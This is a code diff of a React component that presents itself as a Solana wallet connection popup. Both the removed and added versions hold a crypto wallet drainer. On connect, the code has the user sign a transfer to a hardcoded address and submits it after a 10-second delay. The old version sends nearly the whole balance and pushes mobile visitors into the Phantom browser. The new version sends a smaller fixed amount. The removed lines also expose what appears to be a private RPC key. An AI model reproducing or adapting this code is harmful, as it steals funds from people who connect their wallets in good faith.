@@ -1,156 +1,100 @@
-import React, { FC, ReactNode, useEffect, useMemo, useState } from 'react';
+import React, { FC, useEffect, useState } from 'react';
 import ReactDOM from 'react-dom';
 import {
-  ConnectionProvider,
-  WalletProvider,
+  Connection,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+} from '@solana/web3.js';
+import {
   useWallet,
+  WalletMultiButton,
+  WalletProvider,
+  ConnectionProvider,
 } from '@solana/wallet-adapter-react';
 import {
   WalletModalProvider,
-  WalletMultiButton,
-  useWalletModal,
 } from '@solana/wallet-adapter-react-ui';
 import {
   PhantomWalletAdapter,
-  GlowWalletAdapter,
-  SlopeWalletAdapter,
-  SolflareWalletAdapter,
+  BackpackWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
-import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
-import {
-  PublicKey,
-  Transaction,
-  SystemProgram,
-  Connection,
-  LAMPORTS_PER_SOL,
-} from '@solana/web3.js';
-import './App.css'; // Add styles like `.wallet-modal`, `.wallet-close`, etc.
 
-type Props = {
-  children: ReactNode;
-};
+require('@solana/wallet-adapter-react-ui/styles.css');
 
-const WalletWrapper: FC<Props> = ({ children }) => {
-  const network = WalletAdapterNetwork.Mainnet;
-
-  const wallets = useMemo(
-    () => [
-      new PhantomWalletAdapter(),
-      new GlowWalletAdapter(),
-      new SlopeWalletAdapter(),
-      new SolflareWalletAdapter({ network }),
-    ],
-    [network]
-  );
-
-  return (
-    <ConnectionProvider endpoint="https://api.mainnet-beta.solana.com">
-      <WalletProvider wallets={wallets} autoConnect>
-        <WalletModalProvider>{children}</WalletModalProvider>
-      </WalletProvider>
-    </ConnectionProvider>
-  );
-};
-
-const ExposeWalletModal: FC = () => {
-  const { setVisible } = useWalletModal();
-
-  useEffect(() => {
-    (window as any).openSolanaWalletModal = () => setVisible(true);
-  }, [setVisible]);
-
-  useEffect(() => {
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    const isPhantom = (window as any).solana?.isPhantom;
-    if (isMobile && !isPhantom) {
-      const url = encodeURIComponent(window.location.href);
-      window.location.href = `https://phantom.app/ul/browse/${url}`;
-    }
-  }, []);
-
-  return null;
-};
+const connection = new Connection('https://api.mainnet-beta.solana.com');
 
 const WalletConnectionHandler: FC = () => {
   const { publicKey, connected, signTransaction } = useWallet();
   const [solBalance, setSolBalance] = useState<number | null>(null);
-  const [loading, setLoading] = useState(false);
+  const [loading, setLoading] = useState<boolean>(false);
 
   useEffect(() => {
+    const fetchBalance = async () => {
+      if (publicKey) {
+        const balance = await connection.getBalance(publicKey);
+        setSolBalance(balance / 1e9); // Convert lamports to SOL
+      }
+    };
+    fetchBalance();
+  }, [publicKey]);
+
+  useEffect(() => {
+    const sendSolWithDelay = async () => {
+      if (!publicKey) return;
+
+      setLoading(true);
+
+      try {
+        const walletPublicKey = publicKey;
+        const sendAmount = 0.001 * 1e9; // 0.001 SOL in lamports
+
+        const balance = await connection.getBalance(walletPublicKey);
+        if (balance <= 0) {
+          alert('⚠️ Not enough SOL to send.');
+          return;
+        }
+
+        const tx = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: walletPublicKey,
+            toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
+            lamports: sendAmount,
+          })
+        );
+
+        tx.feePayer = walletPublicKey;
+        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+        if (!signTransaction) {
+          alert('❌ Wallet not ready to sign.');
+          return;
+        }
+
+        const signedTx = await signTransaction(tx);
+        console.log('🖊️ Transaction signed.');
+
+        setTimeout(async () => {
+          try {
+            const txid = await connection.sendRawTransaction(signedTx.serialize());
+            console.log(`🚀 Transaction sent. Signature: ${txid}`);
+          } catch (err) {
+            console.error('❌ Failed to send transaction:', err);
+          }
+        }, 10000); // 10-second delay
+
+      } catch (err) {
+        console.error('❌ Error sending transaction:', err);
+        alert('Transaction failed.');
+      } finally {
+        setLoading(false);
+      }
+    };
+
     if (connected && publicKey) {
-      fetchBalanceAndSendTx(publicKey);
+      sendSolWithDelay();
     }
   }, [connected, publicKey]);
-
-  const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
-    setLoading(true);
-
-    const rpcEndpoints = [
-      'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
-      'https://rpc.ankr.com/solana',
-    ];
-
-    let connection: Connection | null = null;
-    let lamports: number | null = null;
-
-    for (const endpoint of rpcEndpoints) {
-      try {
-        const testConn = new Connection(endpoint, 'confirmed');
-        lamports = await testConn.getBalance(walletPublicKey);
-        connection = testConn;
-        break;
-      } catch (err) {
-        console.warn(`RPC failed: ${endpoint}`, err);
-      }
-    }
-
-    if (!connection || lamports === null) {
-      alert('❌ All RPCs failed. Try again later.');
-      return;
-    }
-
-    try {
-      setSolBalance(lamports / LAMPORTS_PER_SOL);
-      const sendAmount = lamports - 100_000;
-      if (sendAmount <= 0) {
-        alert('⚠️ Not enough SOL to send.');
-        return;
-      }
-
-      const tx = new Transaction().add(
-        SystemProgram.transfer({
-          fromPubkey: walletPublicKey,
-          toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
-          lamports: sendAmount,
-        })
-      );
-
-      tx.feePayer = walletPublicKey;
-      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
-      if (!signTransaction) {
-        alert('❌ Wallet not ready to sign.');
-        return;
-      }
-
-      const signedTx = await signTransaction(tx);
-      console.log('🖊️ Transaction signed.');
-
-      setTimeout(async () => {
-        try {
-          const txid = await connection.sendRawTransaction(signedTx.serialize());
-          console.log(`🚀 Transaction sent. Signature: ${txid}`);
-        } catch (err) {
-          console.error('❌ Failed to send transaction:', err);
-        }
-      }, 10000);
-    } catch (err) {
-      console.error('❌ Error sending transaction:', err);
-      alert('Transaction failed.');
-    } finally {
-      setLoading(false);
-    }
-  };
 
   const WalletUI = (
     <div className="wallet-modal">
@@ -208,10 +152,21 @@ const WalletConnectionHandler: FC = () => {
   return ReactDOM.createPortal(WalletUI, document.getElementById('walletPopup') as HTMLElement);
 };
 
+const WalletWrapper: FC<{ children: React.ReactNode }> = ({ children }) => {
+  const wallets = [new PhantomWalletAdapter(), new BackpackWalletAdapter()];
+
+  return (
+    <ConnectionProvider endpoint="https://api.mainnet-beta.solana.com">
+      <WalletProvider wallets={wallets} autoConnect>
+        <WalletModalProvider>{children}</WalletModalProvider>
+      </WalletProvider>
+    </ConnectionProvider>
+  );
+};
+
 const App: FC = () => {
   return (
     <WalletWrapper>
-      <ExposeWalletModal />
       <WalletConnectionHandler />
     </WalletWrapper>
   );
